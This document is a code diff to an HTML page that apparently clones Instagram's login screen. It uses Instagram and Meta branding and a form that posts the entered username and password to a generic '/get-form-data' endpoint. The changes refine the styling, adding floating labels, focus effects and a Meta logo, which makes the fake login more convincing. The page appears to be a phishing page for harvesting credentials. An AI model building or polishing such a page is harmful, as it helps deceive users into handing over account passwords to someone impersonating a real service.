@@ -62,34 +62,46 @@
     border: 1px solid #dbdbdb;
     border-radius: 10px;
     margin-top: 14px;
-    padding: 8px 14px 6px;
+    padding: 0 14px;
+    height: 54px;
+    display: flex;
+    align-items: center;
+    transition: border-color 0.15s ease;
+  }
+  .input-wrap:focus-within {
+    border-color: #a8a8a8;
   }
   .input-wrap label {
-    display: block;
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 16px;
     color: #8e8e8e;
-    font-size: 14px;
     line-height: 1.2;
+    pointer-events: none;
+    transition: top 0.15s ease, font-size 0.15s ease, transform 0.15s ease;
+  }
+  .input-wrap.active label {
+    top: 8px;
+    transform: translateY(0);
+    font-size: 11px;
   }
   .input-wrap input {
     width: 100%;
     border: none;
     outline: none;
     font-size: 16px;
-    padding: 2px 0 2px;
+    padding: 0;
+    margin-top: 0;
     color: #000;
     background: transparent;
+    transition: margin-top 0.15s ease;
   }
-  .input-wrap.empty label {
-    position: absolute;
-    top: 50%;
-    left: 14px;
-    transform: translateY(-50%);
-    font-size: 16px;
-    color: #8e8e8e;
-    pointer-events: none;
+  .input-wrap.active input {
+    margin-top: 16px;
   }
-  .input-wrap.empty input { padding-top: 10px; }
-  .input-wrap.empty input { padding-right: 34px; }
+  .input-wrap.has-eye input { padding-right: 30px; }
   .eye-toggle {
     position: absolute;
     right: 14px;
@@ -110,7 +122,7 @@
     width: 22px;
     height: 22px;
   }
-  .input-wrap.empty:focus-within .eye-toggle {
+  .input-wrap.has-eye:focus-within .eye-toggle {
     opacity: 1;
     visibility: visible;
   }
@@ -176,6 +188,8 @@
     <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
   </div>
 
+  <div class="meta-logo">&infin;</div>
+
   <div class="insta-icon">
     <svg viewBox="0 0 96 96" fill="none">
       <defs>
@@ -197,9 +211,9 @@
   <form action="/get-form-data" method="POST">
     <div class="input-wrap">
       <label>Username, email address or mobile number</label>
-      <input type="text" name="username" >
+      <input type="text" name="username" value="">
     </div>
-    <div class="input-wrap empty">
+    <div class="input-wrap has-eye">
       <label>Password</label>
       <input type="password" name="password" id="passwordField">
       <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
@@ -250,6 +264,28 @@
     passwordField.type = visible ? 'text' : 'password';
     eyeIcon.innerHTML = visible ? eyeOpenSVG : eyeClosedSVG;
     eyeToggle.setAttribute('aria-label', visible ? 'Hide password' : 'Show password');
+  });
+
+  // Floating label behaviour (smooth label-up animation like the username field)
+  const inputWraps = document.querySelectorAll('.input-wrap');
+
+  inputWraps.forEach((wrap) => {
+    const input = wrap.querySelector('input');
+
+    const updateState = () => {
+      if (document.activeElement === input || input.value.trim() !== '') {
+        wrap.classList.add('active');
+      } else {
+        wrap.classList.remove('active');
+      }
+    };
+
+    input.addEventListener('focus', updateState);
+    input.addEventListener('blur', updateState);
+    input.addEventListener('input', updateState);
+
+    // set correct initial state (e.g. username already has a value)
+    updateState();
   });
 </script>
 
